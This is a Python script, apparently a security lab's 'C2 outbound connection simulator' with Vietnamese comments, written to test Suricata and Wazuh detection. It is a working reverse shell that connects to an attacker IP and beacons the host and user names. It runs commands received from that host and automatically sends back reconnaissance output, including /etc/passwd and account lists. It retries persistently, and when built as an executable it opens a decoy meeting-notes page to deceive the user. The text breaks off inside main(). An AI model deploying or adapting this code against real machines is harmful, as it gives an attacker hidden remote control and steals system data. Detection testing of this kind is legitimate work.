#!/usr/bin/env python3
"""
C2 Outbound Connection - Reverse Shell Payload Simulator

Kịch bản kiểm thử 1: Kết nối C2 (Outbound Connection)
MITRE ATT&CK: T1071 - Application Layer Protocol

Mục đích:
- Mô phỏng mã độc thiết lập kênh liên lạc bí mật (C2 Channel) với máy chủ điều khiển
- Kiểm tra khả năng phát hiện của hệ thống SmartXDR (Suricata/Zeek, Wazuh)
- Đánh giá cơ chế phản ứng tự động (Auto Response)

Cảnh báo: Script này CHỈ dùng cho mục đích nghiên cứu và kiểm thử bảo mật.
         Việc sử dụng trái phép có thể vi phạm pháp luật.

Author: Cyberfortress Labs
Version: 1.0.0
"""

import socket
import subprocess
import sys
import os
import time
import argparse
import logging
from datetime import datetime
from typing import Optional, List
from pathlib import Path
import tempfile
import threading

# ============================================================================
# CONFIGURATION
# ============================================================================

# Default C2 Server Configuration (can be overridden by config.txt)
DEFAULT_C2_HOST = "192.168.71.100"  # External Attacker IP (Kali Linux)
DEFAULT_C2_PORT = 80                 # HTTP port - disguised as normal web traffic
DEFAULT_RETRY_INTERVAL = 3           # Seconds between reconnection attempts
DEFAULT_MAX_RETRIES = 0              # 0 = infinite retries (persistent)

# Persistent mode settings
PERSISTENT_MODE = True               # Keep trying to reconnect forever
RECONNECT_JITTER = 5                 # Random jitter 0-5 seconds added to retry interval


def load_config_from_file() -> dict:
    """
    Load C2 configuration from config.txt file.
    This allows setting IP before building without modifying source code.
    
    Config file format (one per line):
        C2_HOST=192.168.71.100
        C2_PORT=80
        PERSISTENT=true
        RETRY_INTERVAL=10
    """
    config = {
        "host": DEFAULT_C2_HOST,
        "port": DEFAULT_C2_PORT,
        "persistent": PERSISTENT_MODE,
        "retry_interval": DEFAULT_RETRY_INTERVAL,
    }
    
    # Try to find config file in various locations
    config_locations = [
        Path(__file__).parent / "config.txt",
        Path(sys.argv[0]).parent / "config.txt",
        Path.cwd() / "config.txt",
    ]
    
    for config_path in config_locations:
        if config_path.exists():
            try:
                with open(config_path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if '=' in line and not line.startswith('#'):
                            key, value = line.split('=', 1)
                            key = key.strip().upper()
                            value = value.strip()
                            
                            if key == "C2_HOST":
                                config["host"] = value
                            elif key == "C2_PORT":
                                config["port"] = int(value)
                            elif key == "PERSISTENT":
                                config["persistent"] = value.lower() in ('true', '1', 'yes')
                            elif key == "RETRY_INTERVAL":
                                config["retry_interval"] = int(value)
                break  # Use first found config file
            except:
                pass
    
    return config


# Load config at module level
_CONFIG = load_config_from_file()

# Logging Configuration
LOG_FORMAT = "%(asctime)s - %(levelname)s - %(message)s"
LOG_DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

# ============================================================================
# DECOY DOCUMENT (HTML fake invoice)
# ============================================================================

DECOY_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Meeting Notes - Q4 2025</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { border-bottom: 2px solid #0078d4; padding-bottom: 20px; margin-bottom: 20px; }
        h1 { color: #0078d4; margin: 0; }
        .meta { color: #666; font-size: 0.9em; margin-top: 10px; }
        .section { margin: 20px 0; }
        .section h2 { color: #333; font-size: 1.1em; border-left: 3px solid #0078d4; padding-left: 10px; }
        ul { line-height: 1.8; }
        .footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; color: #999; font-size: 0.85em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📋 Meeting Notes</h1>
            <div class="meta">
                <strong>Date:</strong> December 28, 2025 | 
                <strong>Time:</strong> 10:00 AM - 11:30 AM |
                <strong>Location:</strong> Conference Room A
            </div>
        </div>
        
        <div class="section">
            <h2>Attendees</h2>
            <ul>
                <li>John Smith - Project Manager</li>
                <li>Sarah Johnson - Lead Developer</li>
                <li>Mike Chen - Security Analyst</li>
                <li>Emily Davis - QA Engineer</li>
            </ul>
        </div>
        
        <div class="section">
            <h2>Agenda Items</h2>
            <ul>
                <li>Q4 Project Status Review</li>
                <li>Security Assessment Results</li>
                <li>Budget Planning for Q1 2025</li>
                <li>Team Resource Allocation</li>
            </ul>
        </div>
        
        <div class="section">
            <h2>Action Items</h2>
            <ul>
                <li>✅ Complete security audit by Dec 30</li>
                <li>⏳ Update documentation - In Progress</li>
                <li>📅 Schedule follow-up meeting for Jan 5</li>
            </ul>
        </div>
        
        <div class="footer">
            <p>This document is confidential. Do not distribute without authorization.</p>
            <p>Generated by Meeting Assistant v2.1</p>
        </div>
    </div>
</body>
</html>
"""

# ============================================================================
# LOGGING SETUP
# ============================================================================

def setup_logging(verbose: bool = False) -> logging.Logger:
    """Configure logging for the script."""
    log_level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format=LOG_FORMAT,
        datefmt=LOG_DATE_FORMAT
    )
    return logging.getLogger(__name__)


def show_decoy_document() -> None:
    """
    Display a fake document to trick the user.
    Opens an HTML file in the default browser.
    """
    try:
        temp_dir = tempfile.gettempdir()
        decoy_path = os.path.join(temp_dir, f"Meeting_Notes_{datetime.now().strftime('%H%M%S')}.html")
        
        with open(decoy_path, 'w', encoding='utf-8') as f:
            f.write(DECOY_HTML)
        
        # Open in default browser/application
        if sys.platform == 'win32':
            os.startfile(decoy_path)
        elif sys.platform == 'darwin':
            subprocess.run(['open', decoy_path], check=False)
        else:
            subprocess.run(['xdg-open', decoy_path], check=False)
    except:
        pass  # Silent fail - don't alert user


def trigger_suricata_dns_alerts() -> None:
    """
    Trigger Suricata alerts by sending HTTP requests with C2-like patterns.
    Uses urllib for proper HTTP that Suricata can parse.
    """
    import urllib.request
    import urllib.error
    
    logger = setup_logging(False)
    logger.info("[*] Triggering C2 beacon patterns...")
    
    # Get C2 host from config
    c2_host = _CONFIG.get("host", DEFAULT_C2_HOST)
    c2_port = _CONFIG.get("port", DEFAULT_C2_PORT)
    
    hostname = socket.gethostname()
    username = os.getenv("USERNAME", os.getenv("USER", "unknown"))
    
    # C2 beacon URLs with patterns that match Suricata rules
    beacon_patterns = [
        # Pattern 1: GET /beacon (matches SID 9000010)
        {
            "url": f"http://{c2_host}:{c2_port}/beacon?id={hostname}",
            "method": "GET",
            "headers": {
                "User-Agent": "MalwareBot/1.0",  # matches SID 9000012
                "X-Bot-ID": hostname,             # matches SID 9000013
                "X-User": username,               # matches SID 9000014
            }
        },
        # Pattern 2: POST with type=beacon (matches SID 9000015, 9000016)
        {
            "url": f"http://{c2_host}:{c2_port}/gate.php",  # matches SID 9000011
            "method": "POST",
            "data": f"type=beacon&host={hostname}&user={username}&status=active",
            "headers": {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded",
            }
        },
    ]
    
    for i, pattern in enumerate(beacon_patterns):
        try:
            logger.info(f"[*] Sending C2 beacon pattern {i+1}: {pattern['url']}")
            
            # Build request
            if pattern.get("method") == "POST" and "data" in pattern:
                data = pattern["data"].encode('utf-8')
                req = urllib.request.Request(pattern["url"], data=data)
            else:
                req = urllib.request.Request(pattern["url"])
            
            # Add headers
            for header, value in pattern.get("headers", {}).items():
                req.add_header(header, value)
            
            # Send request (with short timeout)
            try:
                urllib.request.urlopen(req, timeout=3)
                logger.info(f"[+] Beacon sent successfully to {c2_host}")
            except urllib.error.URLError:
                # Connection failed but HTTP request was sent - Suricata sees it!
                logger.info(f"[+] Beacon attempt sent (connection failed - expected)")
            except:
                logger.info(f"[+] Beacon traffic sent to {c2_host}")
                
        except Exception as e:
            logger.debug(f"[-] Beacon pattern {i+1} failed: {e}")
        
        time.sleep(0.3)
    
    logger.info("[+] C2 beacon patterns complete! Check Suricata for alerts.")


# ============================================================================
# REVERSE SHELL CLASS
# ============================================================================

class C2ReverseShell:
    """
    Simulates a reverse shell connection to a C2 server.
    
    This class establishes an outbound TCP connection to the C2 server,
    allowing remote command execution - mimicking real-world malware behavior.
    """
    
    def __init__(
        self,
        c2_host: str = DEFAULT_C2_HOST,
        c2_port: int = DEFAULT_C2_PORT,
        retry_interval: int = DEFAULT_RETRY_INTERVAL,
        max_retries: int = DEFAULT_MAX_RETRIES,
        verbose: bool = False
    ):
        """
        Initialize the C2 reverse shell client.
        
        Args:
            c2_host: IP address of the C2 server
            c2_port: Port number of the C2 server
            retry_interval: Seconds between reconnection attempts
            max_retries: Maximum number of reconnection attempts
            verbose: Enable verbose logging
        """
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.retry_interval = retry_interval
        self.max_retries = max_retries
        self.socket: Optional[socket.socket] = None
        self.connected = False
        self.logger = setup_logging(verbose)
        
    def connect(self) -> bool:
        """
        Establish connection to the C2 server.
        
        Returns:
            True if connection successful, False otherwise
        """
        retries = 0
        
        while retries < self.max_retries:
            try:
                self.logger.info(f"[*] Attempting connection to C2 server: {self.c2_host}:{self.c2_port}")
                self.logger.info(f"[*] Attempt {retries + 1}/{self.max_retries}")
                
                # Create TCP socket
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)  # 10 second timeout
                
                # Connect to C2 server
                self.socket.connect((self.c2_host, self.c2_port))
                self.connected = True
                
                self.logger.info(f"[+] Successfully connected to C2 server!")
                self.logger.info(f"[+] Local endpoint: {self.socket.getsockname()}")
                self.logger.info(f"[+] Remote endpoint: {self.socket.getpeername()}")
                
                return True
                
            except socket.timeout:
                self.logger.warning(f"[-] Connection timeout. Retrying in {self.retry_interval}s...")
                retries += 1
                time.sleep(self.retry_interval)
                
            except ConnectionRefusedError:
                self.logger.error(f"[-] Connection refused. C2 server not listening on port {self.c2_port}")
                retries += 1
                time.sleep(self.retry_interval)
                
            except socket.error as e:
                self.logger.error(f"[-] Socket error: {e}")
                retries += 1
                time.sleep(self.retry_interval)
                
            except Exception as e:
                self.logger.error(f"[-] Unexpected error: {e}")
                retries += 1
                time.sleep(self.retry_interval)
        
        self.logger.error(f"[!] Failed to connect after {self.max_retries} attempts")
        return False
    
    def get_system_info(self) -> str:
        """
        Gather basic system information to send to C2.
        
        Returns:
            String containing system information
        """
        import platform
        
        info = {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "timestamp": datetime.now().isoformat()
        }
        
        return str(info)
    
    def send_beacon(self) -> None:
        """
        Send initial beacon with system information to C2.
        Uses HTTP-like format to trigger Suricata rules.
        """
        if not self.connected or not self.socket:
            self.logger.error("[-] Not connected to C2 server")
            return
            
        try:
            # First send HTTP-like beacon (triggers Suricata HTTP rules)
            self.send_http_beacon()
            
            # Then send plain text beacon
            beacon_data = f"\n[BEACON] New victim connected!\n"
            beacon_data += f"[INFO] {self.get_system_info()}\n"
            beacon_data += f"[SHELL] Ready for commands...\n\n"
            
            self.socket.send(beacon_data.encode())
            self.logger.info("[+] Beacon sent to C2 server")
            
        except Exception as e:
            self.logger.error(f"[-] Failed to send beacon: {e}")
    
    def send_http_beacon(self) -> None:
        """
        Trigger ACTIVE Suricata rules (non-RETIRED).
        
        Since all HTTP rules in suricata.rules are RETIRED, we trigger DNS rules instead:
        1. SID 2055918 - SocGholish Domain DNS Lookup
        2. SID 2055927 - Emmenhtal Loader Domain (mato-camp2.b-cdn.net)
        3. SID 2055928 - Emmenhtal Loader Domain (mato3.b-cdn.net)
        """
        self.logger.info("[*] Triggering ACTIVE Suricata DNS rules...")
        
        # Trigger DNS rules by resolving malicious domains
        self.trigger_dns_rules()
        
        # Also send HTTP beacon for traffic visibility on C2
        self.send_c2_traffic()
    
    def trigger_dns_rules(self) -> None:
        """
        Trigger Suricata DNS rules by performing DNS lookups to malicious domains.
        These are ACTIVE rules (not RETIRED) from suricata.rules.
        """
        import socket as sock
        
        # Malicious domains from suricata.rules (ACTIVE rules only!)
        malicious_domains = [
            # SID 2055918 - SocGholish Domain
            ("virtual.urban-orthodontics.com", "2055918", "SocGholish Malware"),
            
            # SID 2055927-2055937 - Emmenhtal Loader Domains
            ("mato-camp2.b-cdn.net", "2055927", "Emmenhtal Loader"),
            ("mato3.b-cdn.net", "2055928", "Emmenhtal Loader"),
            ("transparency.b-cdn.net", "2055929", "Emmenhtal Loader"),
            ("shortcuts.b-cdn.net", "2055930", "Emmenhtal Loader"),
            ("downloadfile.b-cdn.net", "2055931", "Emmenhtal Loader"),
            ("powers.b-cdn.net", "2055932", "Emmenhtal Loader"),
        ]
        
        for domain, sid, malware_family in malicious_domains[:3]:  # Trigger 3 rules
            try:
                self.logger.info(f"[*] DNS lookup: {domain} (SID {sid} - {malware_family})")
                
                # Perform DNS resolution - this creates DNS traffic visible to Suricata
                sock.gethostbyname(domain)
                self.logger.info(f"[+] Triggered: SID {sid} - {malware_family}")
                
            except sock.gaierror:
                # DNS resolution failed (expected - domain may not exist)
                # But the DNS QUERY was still sent and can be detected!
                self.logger.info(f"[+] Triggered: SID {sid} - DNS query sent (domain not resolved)")
                
            except Exception as e:
                self.logger.debug(f"[-] DNS lookup failed for {domain}: {e}")
            
            time.sleep(0.3)
        
        self.logger.info("[+] DNS rule triggers complete!")
    
    def send_c2_traffic(self) -> None:
        """
        Send C2 traffic pattern over the established socket connection.
        This creates visible traffic even if specific rules don't match.
        """
        import random
        import string
        
        try:
            hostname = socket.gethostname()
            username = os.getenv("USERNAME", os.getenv("USER", "unknown"))
            
            # Send generic C2 beacon traffic
            boundary = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            
            beacon_data = f"POST /beacon HTTP/1.1\r\n"
            beacon_data += f"Host: c2.malware.local\r\n"
            beacon_data += f"User-Agent: MalwareBot/1.0\r\n"
            beacon_data += f"X-Bot-ID: {hostname}\r\n"
            beacon_data += f"X-User: {username}\r\n"
            beacon_data += f"Content-Type: application/x-www-form-urlencoded\r\n"
            beacon_data += f"\r\n"
            beacon_data += f"type=beacon&host={hostname}&user={username}&status=active"
            
            self.socket.send(beacon_data.encode())
            self.logger.info("[+] C2 beacon traffic sent")
            
        except Exception as e:
            self.logger.debug(f"[-] C2 traffic failed: {e}")
    
    def execute_command(self, command: str) -> str:
        """
        Execute a shell command and return the output.
        
        Args:
            command: The command to execute
            
        Returns:
            Command output as string
        """
        try:
            # Kiểm tra lệnh thoát
            if command.strip().lower() in ['exit', 'quit', 'q']:
                return "[EXIT]"
            
            # Xử lý lệnh cd
            if command.strip().startswith('cd '):
                path = command.strip()[3:].strip()
                try:
                    os.chdir(path)
                    return f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    return f"cd: {e}"
            
            # Thực thi lệnh
            if os.name == 'nt':  # Windows
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            else:  # Linux/Unix
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
            
            output = result.stdout
            if result.stderr:
                output += result.stderr
                
            return output if output else "[No output]"
            
        except subprocess.TimeoutExpired:
            return "[Command timeout - exceeded 30 seconds]"
        except Exception as e:
            return f"[Error executing command: {e}]"
    
    def get_prompt(self) -> str:
        """Get the current shell prompt."""
        cwd = os.getcwd()
        username = os.getenv("USERNAME", os.getenv("USER", "user"))
        hostname = socket.gethostname()
        
        if os.name == 'nt':
            return f"\n{username}@{hostname} {cwd}> "
        else:
            return f"\n{username}@{hostname}:{cwd}$ "
    
    def run_shell(self) -> None:
        """
        Main shell loop - receive commands and send back results.
        
        This is the core functionality that mimics malware C2 communication.
        """
        if not self.connected or not self.socket:
            self.logger.error("[-] Not connected to C2 server")
            return
        
        self.logger.info("[*] Starting interactive shell session...")
        self.send_beacon()
        
        # Auto-execute reconnaissance commands (triggers detection!)
        self.auto_reconnaissance()
        
        try:
            # Send initial prompt
            self.socket.send(self.get_prompt().encode())
            
            while True:
                # Receive command from C2
                self.socket.settimeout(None)  # Blocking mode
                data = self.socket.recv(4096)
                
                if not data:
                    self.logger.warning("[-] Connection closed by C2 server")
                    break
                
                command = data.decode().strip()
                
                if not command:
                    self.socket.send(self.get_prompt().encode())
                    continue
                
                self.logger.debug(f"[*] Received command: {command}")
                
                # Execute command
                output = self.execute_command(command)
                
                # Check for exit command
                if output == "[EXIT]":
                    self.socket.send(b"\n[*] Exiting shell...\n")
                    break
                
                # Send output back to C2
                response = output + self.get_prompt()
                self.socket.send(response.encode())
                
        except socket.error as e:
            self.logger.error(f"[-] Socket error during shell session: {e}")
        except KeyboardInterrupt:
            self.logger.info("\n[*] Shell session interrupted by user")
        except Exception as e:
            self.logger.error(f"[-] Error during shell session: {e}")
        finally:
            self.disconnect()
    
    def auto_reconnaissance(self) -> None:
        """
        Automatically execute reconnaissance commands after connection.
        This triggers Wazuh/Sysmon detection for suspicious process execution.
        
        MITRE ATT&CK Techniques triggered:
        - T1082: System Information Discovery
        - T1016: System Network Configuration Discovery
        - T1033: System Owner/User Discovery
        - T1057: Process Discovery
        """
        if not self.connected or not self.socket:
            return
        
        self.logger.info("[*] Running auto-reconnaissance...")
        
        # Reconnaissance commands (common malware behavior)
        recon_commands = [
            ("whoami", "T1033 - User Discovery"),
            ("hostname", "T1082 - System Info"),
            ("ipconfig /all" if os.name == 'nt' else "ip addr", "T1016 - Network Config"),
            ("systeminfo" if os.name == 'nt' else "uname -a", "T1082 - System Info"),
            ("net user" if os.name == 'nt' else "cat /etc/passwd", "T1087 - Account Discovery"),
            ("tasklist" if os.name == 'nt' else "ps aux", "T1057 - Process Discovery"),
            ("netstat -an", "T1049 - Network Connections"),
        ]
        
        try:
            recon_header = "\n" + "="*60 + "\n"
            recon_header += "[AUTO-RECON] Executing reconnaissance commands...\n"
            recon_header += "="*60 + "\n"
            self.socket.send(recon_header.encode())
            
            for cmd, technique in recon_commands:
                try:
                    # Execute command
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    output = result.stdout + result.stderr
                    
                    # Format and send result
                    cmd_output = f"\n[CMD] {cmd}\n"
                    cmd_output += f"[TECHNIQUE] {technique}\n"
                    cmd_output += "-"*40 + "\n"
                    cmd_output += output[:2000]  # Limit output size
                    cmd_output += "\n"
                    
                    self.socket.send(cmd_output.encode())
                    time.sleep(0.5)  # Small delay between commands
                    
                except Exception as e:
                    error_msg = f"\n[CMD] {cmd}\n[ERROR] {e}\n"
                    self.socket.send(error_msg.encode())
            
            recon_footer = "\n" + "="*60 + "\n"
            recon_footer += "[AUTO-RECON] Complete! Waiting for commands...\n"
            recon_footer += "="*60 + "\n"
            self.socket.send(recon_footer.encode())
            
            self.logger.info("[+] Auto-reconnaissance complete")
            
        except Exception as e:
            self.logger.error(f"[-] Auto-recon failed: {e}")
    
    def disconnect(self) -> None:
        """Close the connection to the C2 server."""
        if self.socket:
            try:
                self.socket.close()
                self.logger.info("[*] Connection closed")
            except:
                pass
        self.connected = False


# ============================================================================
# SIMPLE BEACON MODE (Alternative - chỉ gửi beacon, không shell)
# ============================================================================

class C2Beacon:
    """
    Simple beacon mode - chỉ thiết lập kết nối và gửi thông tin hệ thống.
    Phù hợp cho kiểm thử detection mà không cần interactive shell.
    """
    
    def __init__(
        self,
        c2_host: str = DEFAULT_C2_HOST,
        c2_port: int = DEFAULT_C2_PORT,
        beacon_interval: int = 30,
        verbose: bool = False
    ):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.beacon_interval = beacon_interval
        self.logger = setup_logging(verbose)
        
    def send_single_beacon(self) -> bool:
        """Send a single beacon to C2 and disconnect."""
        try:
            self.logger.info(f"[*] Sending beacon to {self.c2_host}:{self.c2_port}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.c2_host, self.c2_port))
            
            # Build beacon message
            import platform
            beacon = {
                "type": "beacon",
                "hostname": socket.gethostname(),
                "os": platform.system(),
                "user": os.getenv("USERNAME", os.getenv("USER", "unknown")),
                "timestamp": datetime.now().isoformat()
            }
            
            sock.send(f"[BEACON] {beacon}\n".encode())
            self.logger.info("[+] Beacon sent successfully")
            
            sock.close()
            return True
            
        except Exception as e:
            self.logger.error(f"[-] Failed to send beacon: {e}")
            return False
    
    def run_persistent(self, count: int = 0) -> None:
        """
        Run persistent beaconing.
        
        Args:
            count: Number of beacons to send (0 = infinite)
        """
        sent = 0
        while count == 0 or sent < count:
            self.send_single_beacon()
            sent += 1
            
            if count == 0 or sent < count:
                self.logger.info(f"[*] Next beacon in {self.beacon_interval} seconds...")
                time.sleep(self.beacon_interval)


# ============================================================================
# IOC TRIGGER MODE - Kết nối đến danh sách IP độc hại để trigger detection
# ============================================================================

class IOCTrigger:
    """
    IOC Trigger Mode - Đọc danh sách IP từ file và kết nối đến từng IP.
    
    Mục đích: Trigger các hệ thống detection (Suricata, Zeek, Wazuh) bằng cách
    tạo kết nối đến các IP đã được đánh dấu là malicious trong MISP/Threat Intel.
    """
    
    DEFAULT_IOC_FILE = "malicious_ip.txt"
    
    def __init__(
        self,
        ioc_file: str = None,
        port: int = DEFAULT_C2_PORT,
        timeout: int = 3,
        delay: float = 1.0,
        verbose: bool = False
    ):
        """
        Initialize IOC Trigger.
        
        Args:
            ioc_file: Path to file containing malicious IPs (one per line)
            port: Port to connect to (default: 80)
            timeout: Connection timeout in seconds
            delay: Delay between connections in seconds
            verbose: Enable verbose logging
        """
        self.ioc_file = ioc_file or self.DEFAULT_IOC_FILE
        self.port = port
        self.timeout = timeout
        self.delay = delay
        self.logger = setup_logging(verbose)
        self.results = []
        
    def load_ips(self) -> List[str]:
        """
        Load IP addresses from file.
        
        Returns:
            List of IP addresses
        """
        ips = []
        file_path = Path(self.ioc_file)
        
        if not file_path.exists():
            self.logger.error(f"[-] IOC file not found: {self.ioc_file}")
            return ips
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    # Skip comments and empty lines
                    if line and not line.startswith('#'):
                        # Validate IP format (basic check)
                        parts = line.split('.')
                        if len(parts) == 4:
                            ips.append(line)
                        else:
                            self.logger.warning(f"[!] Invalid IP format, skipping: {line}")
            
            self.logger.info(f"[+] Loaded {len(ips)} IPs from {self.ioc_file}")
            return ips
            
        except Exception as e:
            self.logger.error(f"[-] Error reading IOC file: {e}")
            return ips
    
    def trigger_single(self, ip: str) -> dict:
        """
        Attempt connection to a single IP to trigger detection.
        
        Args:
            ip: Target IP address
            
        Returns:
            Dict with connection result
        """
        result = {
            "ip": ip,
            "port": self.port,
            "timestamp": datetime.now().isoformat(),
            "success": False,
            "error": None
        }
        
        try:
            self.logger.info(f"[*] Triggering IOC: {ip}:{self.port}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Attempt connection - this is what triggers detection
            sock.connect((ip, self.port))
            
            # If connection succeeds, send some data
            try:
                sock.send(b"GET / HTTP/1.1\r\nHost: malware-c2\r\n\r\n")
            except:
                pass
            
            sock.close()
            result["success"] = True
            self.logger.info(f"[+] Connection established to {ip}:{self.port}")
            
        except socket.timeout:
            result["error"] = "timeout"
            self.logger.info(f"[~] Timeout connecting to {ip}:{self.port} (IOC triggered)")
            
        except ConnectionRefusedError:
            result["error"] = "refused"
            self.logger.info(f"[~] Connection refused by {ip}:{self.port} (IOC triggered)")
            
        except OSError as e:
            if "No route to host" in str(e) or "unreachable" in str(e).lower():
                result["error"] = "unreachable"
                self.logger.info(f"[~] Host unreachable {ip}:{self.port} (IOC triggered)")
            else:
                result["error"] = str(e)
                self.logger.warning(f"[-] Error connecting to {ip}: {e}")
                
        except Exception as e:
            result["error"] = str(e)
            self.logger.warning(f"[-] Unexpected error for {ip}: {e}")
        
        return result
    
    def run(self) -> List[dict]:
        """
        Run IOC trigger against all IPs in the list.
        
        Returns:
            List of connection results
        """
        ips = self.load_ips()
        
        if not ips:
            self.logger.error("[-] No IPs to process. Exiting.")
            return []
        
        print(f"\n{'='*60}")
        print(f"IOC TRIGGER MODE - Simulating Malicious Connections")
        print(f"{'='*60}")
        print(f"Target IPs: {len(ips)}")
        print(f"Port: {self.port}")
        print(f"Timeout: {self.timeout}s")
        print(f"Delay: {self.delay}s")
        print(f"{'='*60}\n")
        
        for i, ip in enumerate(ips, 1):
            print(f"[{i}/{len(ips)}] ", end="")
            result = self.trigger_single(ip)
            self.results.append(result)
            
            # Delay between connections
            if i < len(ips):
                time.sleep(self.delay)
        
        # Print summary
        self._print_summary()
        
        return self.results
    
    def _print_summary(self) -> None:
        """Print summary of IOC trigger results."""
        total = len(self.results)
        connected = sum(1 for r in self.results if r["success"])
        timeout = sum(1 for r in self.results if r.get("error") == "timeout")
        refused = sum(1 for r in self.results if r.get("error") == "refused")
        unreachable = sum(1 for r in self.results if r.get("error") == "unreachable")
        
        print(f"\n{'='*60}")
        print("IOC TRIGGER SUMMARY")
        print(f"{'='*60}")
        print(f"Total IPs processed:  {total}")
        print(f"Connected:            {connected}")
        print(f"Timeout:              {timeout}")
        print(f"Refused:              {refused}")
        print(f"Unreachable:          {unreachable}")
        print(f"{'='*60}")
        print("\n[!] All connection attempts should have triggered IOC detection!")
        print("[!] Check Suricata/Zeek logs, Wazuh alerts, and SIEM for detections.\n")


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="C2 Outbound Connection Simulator - MITRE ATT&CK T1071",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive reverse shell
  python c2_reverse_shell.py --host 192.168.71.100 --port 80
  
  # Beacon mode only (single beacon)
  python c2_reverse_shell.py --host 192.168.71.100 --port 80 --beacon
  
  # Persistent beaconing (every 30 seconds, 5 times)
  python c2_reverse_shell.py --host 192.168.71.100 --port 80 --beacon --interval 30 --count 5
  
  # IOC Trigger mode - connect to malicious IPs from file
  python c2_reverse_shell.py --ioc-file malicious_ip.txt
  
  # IOC Trigger with custom port and delay
  python c2_reverse_shell.py --ioc-file malicious_ip.txt --port 443 --delay 2.0

Setup C2 Listener (on Kali Linux):
  nc -lvnp 80
        """
    )
    
    parser.add_argument(
        '-H', '--host',
        type=str,
        default=DEFAULT_C2_HOST,
        help=f'C2 Server IP address (default: {DEFAULT_C2_HOST})'
    )
    
    parser.add_argument(
        '-p', '--port',
        type=int,
        default=DEFAULT_C2_PORT,
        help=f'C2 Server port (default: {DEFAULT_C2_PORT})'
    )
    
    parser.add_argument(
        '-r', '--retries',
        type=int,
        default=DEFAULT_MAX_RETRIES,
        help=f'Max connection retries (default: {DEFAULT_MAX_RETRIES})'
    )
    
    parser.add_argument(
        '-b', '--beacon',
        action='store_true',
        help='Beacon mode only (no interactive shell)'
    )
    
    parser.add_argument(
        '-i', '--interval',
        type=int,
        default=30,
        help='Beacon interval in seconds (default: 30)'
    )
    
    parser.add_argument(
        '-c', '--count',
        type=int,
        default=1,
        help='Number of beacons to send, 0 for infinite (default: 1)'
    )
    
    parser.add_argument(
        '--ioc-file',
        type=str,
        default=None,
        help='Path to file containing malicious IPs (one per line) for IOC trigger mode'
    )
    
    parser.add_argument(
        '--timeout',
        type=int,
        default=3,
        help='Connection timeout for IOC trigger mode (default: 3s)'
    )
    
    parser.add_argument(
        '--delay',
        type=float,
        default=1.0,
        help='Delay between IOC trigger connections (default: 1.0s)'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )
    
    parser.add_argument(
        '-d', '--decoy',
        action='store_true',
        help='Show decoy document (fake meeting notes) when starting'
    )
    
    return parser.parse_args()


def print_banner() -> None:
    """Print the script banner."""
    banner = """
╔═══════════════════════════════════════════════════════════════════╗
║     C2 OUTBOUND CONNECTION SIMULATOR                              ║
║     MITRE ATT&CK: T1071 - Application Layer Protocol              ║
║                                                                   ║
║     Cyberfortress Labs - Security Testing Framework               ║
╚═══════════════════════════════════════════════════════════════════╝

[!] WARNING: This tool is for authorized security testing ONLY.
[!] Unauthorized use may violate applicable laws and regulations.
    """
    print(banner)


def main() -> None:
    """Main entry point."""
    args = parse_arguments()
    
    # Show decoy document first (if --decoy flag or running as .exe without console)
    # This makes it look like a legitimate document
    if getattr(args, 'decoy', False) or (hasattr(sys, 'frozen') and getattr(sys, 'frozen', False)):
        show_decoy_document()
    else:
        # Only show banner if not in stealth mode
        print_banner()
    
    # IMPORTANT: Trigger DNS rules IMMEDIATELY (before C2 connection)
    # This ensures Suricata alerts even if C2 server is unreachable
    trigger_suricata_dns_alerts()
    
    # Determine mode
    if args.ioc_file:
        mode = "IOC Trigger"
    elif args.beacon:
        mode = "Beacon"
    else:
        mode = "Interactive Shell"
    
    # Only print config if not in stealth mode
    if not (hasattr(sys, 'frozen') and getattr(sys, 'frozen', False)):
        print(f"\n[*] Configuration:")
        if args.ioc_file:
            print(f"    IOC File: {args.ioc_file}")
            print(f"    Port: {args.port}")
        else:
            print(f"    C2 Server: {args.host}:{args.port}")
        print(f"    Mode: {mode}")
        print()
    
    try:
        if args.ioc_file:
            # IOC Trigger mode
            trigger = IOCTrigger(
                ioc_file=args.ioc_file,
                port=args.port,
                timeout=args.timeout,
                delay=args.delay,
                verbose=args.verbose
            )
            trigger.run()
            
        elif args.beacon:
            # Beacon mode
            beacon = C2Beacon(
                c2_host=args.host,
                c2_port=args.port,
                beacon_interval=args.interval,
                verbose=args.verbose
            )
            
            if args.count == 1:
                beacon.send_single_beacon()
            else:
                beacon.run_persistent(count=args.count)
        else:
            # Interactive shell mode with persistent reconnect
            import random
            
            # Use config file settings if no CLI args provided
